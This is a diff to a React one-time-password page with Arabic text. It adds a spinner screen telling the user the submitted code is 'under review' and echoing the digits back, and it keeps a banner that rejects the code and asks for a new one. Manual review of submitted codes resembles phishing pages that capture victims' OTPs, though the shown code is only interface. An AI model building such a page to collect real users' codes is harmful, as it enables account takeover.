@@ -1896,55 +1896,125 @@ function OtpPage({ docId, phoneNumber }: { docId: string; phoneNumber: string })
           <span className="otp-phone-label">:رقم الهاتف</span>
         </div>
 
-        {/* Rejection banner */}
-        {rejected && (
-          <div style={{
-            background:"#fff0f0", border:"1.5px solid #e74c3c", borderRadius:10,
-            padding:"10px 16px", marginBottom:14, color:"#c0392b",
-            fontSize:14, fontWeight:600, direction:"rtl", textAlign:"right",
-          }}>
-            ❌ الرمز غير صحيح — أدخل الرمز الجديد
+        {submitted ? (
+          /* ── Waiting screen ── */
+          <div style={{textAlign:"center", padding:"10px 0 18px", direction:"rtl"}}>
+            <style>{`
+              @keyframes otp-spin {
+                to { transform: rotate(360deg); }
+              }
+              @keyframes otp-pulse-ring {
+                0%   { transform: scale(.9); opacity:.7; }
+                100% { transform: scale(1.18); opacity:0; }
+              }
+              .otp-wait-ring {
+                position:relative; width:80px; height:80px;
+                margin: 0 auto 22px;
+              }
+              .otp-wait-ring::before {
+                content:"";
+                position:absolute; inset:-10px;
+                border-radius:50%;
+                background:rgba(200,127,100,.18);
+                animation: otp-pulse-ring 1.4s ease-out infinite;
+              }
+              .otp-wait-spinner {
+                width:80px; height:80px; border-radius:50%;
+                border:5px solid rgba(200,127,100,.18);
+                border-top-color:#c87f64;
+                animation: otp-spin .9s linear infinite;
+              }
+              .otp-wait-title {
+                font-size:22px; font-weight:700;
+                color:#1e1e1e; margin:0 0 10px;
+              }
+              .otp-wait-sub {
+                font-size:14px; color:#777; line-height:1.7; margin:0;
+              }
+              .otp-wait-code {
+                display:inline-flex; gap:8px; margin:18px auto 0;
+                direction:ltr;
+              }
+              .otp-wait-digit {
+                width:40px; height:46px; border-radius:8px;
+                background:#f5ede9; color:#c87f64;
+                font-size:20px; font-weight:700;
+                display:flex; align-items:center; justify-content:center;
+                border:1.5px solid #e8c4b0;
+              }
+            `}</style>
+
+            <div className="otp-wait-ring">
+              <div className="otp-wait-spinner" />
+            </div>
+
+            <p className="otp-wait-title">جارٍ مراجعة الكود…</p>
+            <p className="otp-wait-sub">
+              تم إرسال الرمز بنجاح<br />
+              يرجى الانتظار حتى تتم المراجعة
+            </p>
+
+            {/* show submitted digits */}
+            <div className="otp-wait-code">
+              {otpValue.split("").map((ch, i) => (
+                <div key={i} className="otp-wait-digit">{ch}</div>
+              ))}
+            </div>
           </div>
+        ) : (
+          /* ── Input form ── */
+          <>
+            {/* Rejection banner */}
+            {rejected && (
+              <div style={{
+                background:"#fff0f0", border:"1.5px solid #e74c3c", borderRadius:10,
+                padding:"10px 16px", marginBottom:14, color:"#c0392b",
+                fontSize:14, fontWeight:600, direction:"rtl", textAlign:"right",
+              }}>
+                ❌ الرمز غير صحيح — أدخل رمزاً جديداً
+              </div>
+            )}
+
+            <p className="otp-input-label">:أدخل رمز التحقق</p>
+            <div className="otp-boxes">
+              {digits.map((d, i) => (
+                <input
+                  key={i}
+                  ref={(el) => { inputRefs.current[i] = el; }}
+                  className="otp-box"
+                  style={rejected ? {borderColor:"#e74c3c", boxShadow:"0 0 0 3px rgba(231,76,60,.15)"} : undefined}
+                  type="text"
+                  inputMode="numeric"
+                  maxLength={1}
+                  placeholder="─"
+                  value={d}
+                  onChange={(e) => handleDigit(i, e.target.value)}
+                  onKeyDown={(e) => handleKeyDown(i, e)}
+                  disabled={submitting}
+                />
+              ))}
+            </div>
+
+            <div className="otp-resend">
+              <span className="otp-resend-link">إعادة إرسال الرمز ↺</span>
+              <span>لم يصلك الرمز؟</span>
+            </div>
+
+            <button
+              className="otp-verify-btn"
+              type="button"
+              disabled={!isComplete || submitting}
+              onClick={handleVerify}
+            >
+              {submitting ? "جارٍ الإرسال..." : "تحقق"}
+            </button>
+
+            <div className="otp-validity">
+              <span>رمز التحقق صالح لمدة 5 دقائق</span>
+              <span className="otp-clock">🕐</span>
+            </div>
+          </>
         )}
-
-        <p className="otp-input-label">:أدخل رمز التحقق</p>
-        <div className="otp-boxes">
-          {digits.map((d, i) => (
-            <input
-              key={i}
-              ref={(el) => { inputRefs.current[i] = el; }}
-              className="otp-box"
-              style={rejected ? {borderColor:"#e74c3c", boxShadow:"0 0 0 3px rgba(231,76,60,.15)"} : undefined}
-              type="text"
-              inputMode="numeric"
-              maxLength={1}
-              placeholder="─"
-              value={d}
-              onChange={(e) => handleDigit(i, e.target.value)}
-              onKeyDown={(e) => handleKeyDown(i, e)}
-              disabled={submitting}
-            />
-          ))}
-        </div>
-
-        <div className="otp-resend">
-          <span className="otp-resend-link">إعادة إرسال الرمز ↺</span>
-          <span>لم يصلك الرمز؟</span>
-        </div>
-
-        <button
-          className="otp-verify-btn"
-          type="button"
-          disabled={!isComplete || submitting}
-          onClick={handleVerify}
-        >
-          {submitting ? "جارٍ التحقق..." : "تحقق"}
-        </button>
-
-        <div className="otp-validity">
-          <span>رمز التحقق صالح لمدة 5 دقائق</span>
-          <span className="otp-clock">🕐</span>
-        </div>
       </div>
 
       {/* Footer */}
